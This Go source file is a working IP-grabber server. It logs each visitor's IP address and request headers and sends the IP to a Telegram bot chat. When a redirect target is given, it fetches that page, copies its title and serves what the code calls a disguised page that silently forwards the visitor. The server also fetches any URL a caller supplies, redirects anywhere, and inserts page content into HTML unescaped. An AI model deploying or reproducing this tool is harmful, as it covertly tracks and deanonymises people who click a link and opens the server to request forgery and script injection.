package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"golang.org/x/net/html"
	"io"


	"github.com/joho/godotenv"
)

// Load environment variables from .env file
func init() {
	err := godotenv.Load()
	if err != nil {
		log.Fatal("Error loading .env file")
	}
}

func extractTitle(body io.Reader) (string, error) {
	z := html.NewTokenizer(body)
	for {
		tt := z.Next()
		switch {
		case tt == html.ErrorToken:
			return "", fmt.Errorf("no title found")
		case tt == html.StartTagToken:
			t := z.Token()
			if t.Data == "title" {
				z.Next()
				return z.Token().Data, nil
			}
		}
	}
}

// sendTelegramMessage sends a message to the specified Telegram bot chat
func sendTelegramMessage(message string) {
	telegramToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")

	if telegramToken == "" || chatID == "" {
		log.Fatal("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set in environment variables")
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
	data := url.Values{
		"chat_id": {chatID},
		"text":    {message},
	}

	// Debugging: Log the chat ID
	fmt.Println("Sending message to chat_id:", chatID)

	_, err := http.PostForm(apiURL, data)
	if err != nil {
		log.Printf("Failed to send message to Telegram: %v", err)
	}
}

// logIp handles logging the IP address and redirecting
func logIp(w http.ResponseWriter, r *http.Request) {
	log.Println("headers:", r.Header)
	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		log.Println("X-Forwarded-For header not found, using RemoteAddr")
		ip = r.RemoteAddr
	}

	message := fmt.Sprintf("IP Address: %s", ip)
	fmt.Println(message)

	// Send the message to Telegram
	sendTelegramMessage(message)

	// Capture the 'redirect' query parameter
	redirectURL := r.URL.Query().Get("redirect")
	if redirectURL != "" {
		// Validate the URL (optional, for security)
		_, err := url.ParseRequestURI(redirectURL)
		if err != nil {
			http.Error(w, "Invalid URL", http.StatusBadRequest)
			return
		}

		// Redirect the user to the provided URL
		if redirectURL != "" {
			// Validate and parse the URL
			_, err := url.ParseRequestURI(redirectURL)
			if err != nil {
				http.Error(w, "Invalid URL", http.StatusBadRequest)
				return
			}
		
			// Fetch the destination page
			resp, err := http.Get(redirectURL)
			if err != nil || resp.StatusCode != 200 {
				http.Error(w, "Failed to fetch redirect target", http.StatusInternalServerError)
				return
			}
			defer resp.Body.Close()
		
			// Extract the title
			title, err := extractTitle(resp.Body)
			if err != nil {
				title = "Redirecting..."
			}
		
			// Serve a disguised page with the real page's title and meta redirect
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprintf(w, `<!DOCTYPE html>
		<html lang="en">
		<head>
			<meta charset="UTF-8">
			<meta http-equiv="refresh" content="0;url=%s">
			<title>%s</title>
		</head>
		<body>
			<p>If you are not redirected automatically, <a href="%s">click here</a>.</p>
		</body>
		</html>`, redirectURL, title, redirectURL)
		
			return
		}
		
		return
	}

	// If no redirect URL is provided, just acknowledge the request
	w.Write([]byte("IP Address logged, but no redirect URL provided"))
}

func main() {
	http.HandleFunc("/", logIp)
	fmt.Println("Server is running on port 8080")
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		log.Fatal(err)
	}
}
